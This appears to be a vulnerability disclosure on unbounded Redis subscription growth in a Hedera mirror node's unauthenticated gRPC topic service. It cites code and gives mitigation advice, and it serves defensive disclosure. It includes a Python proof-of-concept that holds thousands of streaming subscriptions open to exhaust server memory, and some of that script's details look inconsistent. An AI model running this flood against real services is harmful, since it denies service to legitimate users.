### Title
Unbounded Redis Pub/Sub Subscription Growth via Unauthenticated gRPC Topic Enumeration

### Summary
`RedisTopicListener.getSharedListener()` creates one Redis pub/sub subscription per distinct topic ID via `topicMessages.computeIfAbsent`, with no cap on the total number of active subscriptions. Because the gRPC endpoint has no authentication and `maxConcurrentCallsPerConnection` only limits calls per TCP connection (not total connections), an unauthenticated attacker can open arbitrarily many connections, subscribe to thousands of distinct valid topic IDs, and cause unbounded growth of both the `topicMessages` `ConcurrentHashMap` and the `ReactiveRedisMessageListenerContainer`'s internal subscription registry, leading to Java heap exhaustion and Redis resource degradation.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `topicListener.listen(filter)` → `SharedTopicListener.listen()` → `RedisTopicListener.getSharedListener()` → `subscribe(topic)`. [1](#0-0) 

```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
``` [2](#0-1) 

The `subscribe()` method calls `r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer)`, registering a new channel subscription with the shared `ReactiveRedisMessageListenerContainer`. The `topicMessages` map is an unbounded `ConcurrentHashMap<String, Flux<TopicMessage>>` with no size cap. [3](#0-2) 

**Root cause:** The sharing mechanism (`computeIfAbsent` + `.share()`) correctly deduplicates subscriptions for the *same* topic, but provides zero protection against an attacker subscribing to N *distinct* topic IDs — each distinct topic ID creates a new entry in `topicMessages` and a new subscription in the container.

**Why the `maxConcurrentCallsPerConnection` limit fails:** The Netty property limits 5 concurrent gRPC calls *per TCP connection*, not globally. [4](#0-3) 

There is no limit on the number of TCP connections. An attacker with K connections can hold 5K simultaneous subscriptions to 5K distinct topics.

**Why `checkTopicExists = true` fails as a mitigation:** [5](#0-4) 

Valid topic IDs on Hedera are publicly enumerable via the unauthenticated REST API (`/api/v1/topics`). On mainnet/testnet there are tens of thousands of valid topic IDs, providing ample ammunition.

**Cleanup path is also broken under attack:** `unsubscribe()` is only triggered on `doOnCancel`/`doOnComplete`. [6](#0-5) 

An attacker who keeps connections open prevents cleanup, holding all subscriptions alive indefinitely.

### Impact Explanation

1. **Java heap exhaustion:** Each entry in `topicMessages` holds a `.share()`-wrapped `Flux` with internal subscriber state. With tens of thousands of entries, the JVM heap is exhausted, crashing the gRPC service.
2. **`ReactiveRedisMessageListenerContainer` degradation:** Each `receive()` call registers an additional channel listener in the container's internal routing table. With thousands of subscriptions, message dispatch overhead grows, degrading latency for all legitimate subscribers.
3. **Redis memory pressure:** Redis must track each subscribed channel name. While Redis itself is resilient, the combination of Java-side and Redis-side resource consumption amplifies the impact.
4. **Denial of service to the importer pipeline:** If the gRPC service crashes or Redis becomes unresponsive, the importer can no longer publish transaction gossip to any channel, breaking the live message delivery path for all users.

### Likelihood Explanation

- **No authentication required** on the gRPC endpoint — any internet-accessible deployment is reachable.
- **Valid topic IDs are trivially enumerable** via the public REST API with no rate limiting on the gRPC side.
- **Attack is repeatable and automatable:** A script opening 200 TCP connections and subscribing to 5 distinct topics each (1,000 unique topics) is trivial to write.
- **No existing global connection limit** is configured in the codebase. [7](#0-6) 

### Recommendation

1. **Cap `topicMessages` map size:** Enforce a maximum number of concurrent distinct-topic Redis subscriptions (e.g., via a `LRU`-bounded map or an explicit counter with rejection).
2. **Add a global gRPC connection limit:** Configure `serverBuilder.maxConnectionAge()` and `serverBuilder.maxConnections()` in `GrpcConfiguration`.
3. **Add per-IP or global subscription rate limiting** at the gRPC interceptor layer before `subscribeTopic()` is reached.
4. **Require authentication** for the `subscribeTopic` RPC, or at minimum add IP-based throttling via a gRPC `ServerInterceptor`.

### Proof of Concept

**Preconditions:**
- Mirror node gRPC endpoint is publicly accessible (default port 5600).
- Valid topic IDs are enumerated via `GET /api/v1/topics` on the REST API.

**Steps:**

```python
import grpc
import threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2

GRPC_HOST = "mirror.node.host:5600"
# Enumerate N distinct valid topic IDs from REST API
TOPIC_IDS = [i for i in range(1000, 6000)]  # 5000 distinct topics

def open_subscription(topic_num):
    channel = grpc.insecure_channel(GRPC_HOST)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery()
    req.topicID.topicNum = topic_num
    # Keep stream open indefinitely — prevents unsubscribe() cleanup
    for _ in stub.subscribeTopic(req):
        pass

threads = [threading.Thread(target=open_subscription, args=(t,)) for t in TOPIC_IDS]
for t in threads:
    t.start()
# 5000 distinct Redis pub/sub subscriptions now held open
# topicMessages ConcurrentHashMap has 5000 entries
# ReactiveRedisMessageListenerContainer has 5000 registered channels
```

**Result:** The `topicMessages` map grows to 5,000 entries, each holding a live `.share()` Flux. JVM heap usage spikes. The `ReactiveRedisMessageListenerContainer` routes messages across 5,000 channels. Continued scaling (50,000+ topics) causes OOM or severe latency degradation, denying service to legitimate subscribers.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L33-33)
```java
    private final Map<String, Flux<TopicMessage>> topicMessages; // Topic name to active subscription
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L59-62)
```java
    protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
        Topic topic = getTopic(filter);
        return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L68-80)
```java
    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L82-85)
```java
    private void unsubscribe(Topic topic) {
        topicMessages.remove(topic.getTopic());
        log.info("Unsubscribing from {}", topic);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L19-19)
```java
    private boolean checkTopicExists = true;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```
